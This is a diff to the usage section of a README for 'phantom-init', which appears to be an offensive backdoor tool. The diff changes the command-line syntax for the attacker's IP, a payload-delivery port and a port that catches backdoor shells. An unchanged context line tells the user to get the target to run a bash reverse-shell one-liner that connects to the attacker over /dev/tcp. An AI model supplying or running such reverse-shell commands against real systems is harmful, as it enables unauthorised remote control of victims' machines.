@@ -15,11 +15,11 @@ otherwise the same payload gets executed each time the target connects to your m
 ## Usage
 
 ```
-phantom-init  [ip][1st-port][2nd-port]
+phantom-init  [ip=][port1=][port2=]
 ```
-* ip: the attacker's ip
-* 1st-port: the port that listens for connections to deliver the payload
-* 2nd-port: the port that listens for the backdoor shells after delivering the payload
+* ip: the attacker's ip (e.g. ip=127.0.0.1)
+* port1: the port that listens for connections to deliver the payload (e.g. port1=8888)
+* port2: the port that listens for the backdoor shells after delivering the payload (e.g. port2=9999)
 
 You have to somehow make the target execute this code, so that he connects to the 1st-port:  
 bash -c 'bash &>/dev/tcp/ip/1st-port 0>&1 &'  
